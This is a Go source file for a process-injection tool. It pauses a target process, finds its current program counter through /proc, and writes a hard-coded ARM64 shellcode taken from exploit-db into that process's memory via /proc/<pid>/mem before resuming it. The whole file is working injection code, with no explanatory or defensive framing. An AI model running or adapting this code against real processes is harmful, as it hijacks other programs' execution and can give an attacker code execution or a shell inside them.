package proc_injector

import (
	"fmt"
	"github.com/prometheus/procfs"
	"io"
	"os"
	"strconv"
	"strings"
	"syscall"
)

type Injector struct {
	memFile *MemRW
}

func NewInjector(pid int) *Injector {
	var memFile = NewMemRW(pid)
	return &Injector{memFile: memFile}
}

// ShellCode from exploit-db: https://www.exploit-db.com/exploits/47048
const ShellCode = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

func (s *Injector) Inject(pid int) {
	//atexit handlers[only for libc]
	//dirFs := os.DirFS(fmt.Sprintf("/proc/%d/task", pid))
	//threadDirEntries, err := fs.ReadDir(dirFs, ".")
	//if err != nil {
	//	panic(err)
	//}
	procFS, err := procfs.NewFS("/proc")
	if err != nil {
		panic(err)
	}
	//in linux, thread can be regarded as process, containing everything that a process have.
	//suspend all thread
	//for _, threadDirEntry := range threadDirEntries {
	//	pid64, err := strconv.ParseInt(threadDirEntry.Name(), 10, 64)
	//	if err != nil { //impossible naturally
	//		panic(err)
	//	}
	//	err = syscall.Kill(int(pid64), syscall.SIGSTOP)
	//	if err != nil {
	//		panic(err)
	//	}
	//}
	//send sigstop to target process
	err = syscall.Kill(int(pid), syscall.SIGSTOP)
	if err != nil {
		panic(err)
	}
	procItem, err := procFS.Proc(pid)
	if err != nil {
		panic(err)
	}
	exePath, err := procItem.Executable()
	if err != nil {
		panic(err)
	}
	fmt.Println("exe path:", exePath)
	var baseAddr int64 = 0
	mapsEntries, err := procItem.ProcMaps()
	if err != nil {
		panic(err)
	}
	for _, mapsEntry := range mapsEntries {
		if !mapsEntry.Perms.Execute {
			continue
		}
		if mapsEntry.Pathname == exePath {
			baseAddr = int64(mapsEntry.StartAddr)
			fmt.Printf("base addr:%x\n", mapsEntry.StartAddr)
			continue
		}
	}
	var syscallFilePath = fmt.Sprintf("/proc/%d/syscall", pid)
	syscallFile, err := os.Open(syscallFilePath)
	if err != nil {
		panic(err)
	}
	syscallFileContent, err := io.ReadAll(syscallFile)
	if err != nil {
		panic(err)
	}
	var syscallFileItems = strings.Split(string(syscallFileContent), " ")
	var syscallNoStr = syscallFileItems[0]
	syscallNoint64, err := strconv.ParseInt(syscallNoStr, 10, 64)
	if err != nil {
		panic(err)
	}
	fmt.Println("syscall no:", syscallNoint64)
	var pcStr = syscallFileItems[len(syscallFileItems)-1]
	pcStr = strings.TrimSuffix(pcStr, "\n")
	pcStr = strings.TrimPrefix(pcStr, "0x")
	fmt.Println("pc str:", pcStr)
	pcint64, err := strconv.ParseInt(pcStr, 16, 64)
	if err != nil {
		panic(err)
	}
	//0x5e769ca5c0 5e769ca5c0
	fmt.Printf("pc:%x %x\n", pcint64, pcint64-baseAddr)
	var toCrashData = []byte(ShellCode) //[]byte{0x00, 0x00, 0x00, 0x00}
	s.memFile.WriteToAddr(pcint64, toCrashData)
	err = syscall.Kill(pid, syscall.SIGCONT)
	if err != nil {
		panic(err)
	}
}

type MemRW struct {
	memFile *os.File
}

func (m *MemRW) setAddr(addr int64) {
	_, err := m.memFile.Seek(int64(addr), io.SeekStart)
	if err != nil {
		panic(err)
	}
}

func (m *MemRW) WriteToAddr(addr int64, content []byte) {
	_, err := m.memFile.WriteAt(content, addr)
	if err != nil {
		panic(err)
	}
}

func NewMemRW(pid int) *MemRW {
	var memFileName = fmt.Sprintf("/proc/%d/mem", pid)
	f, err := os.OpenFile(memFileName, os.O_RDWR, 0644)
	if err != nil {
		panic(err)
	}
	return &MemRW{memFile: f}
}
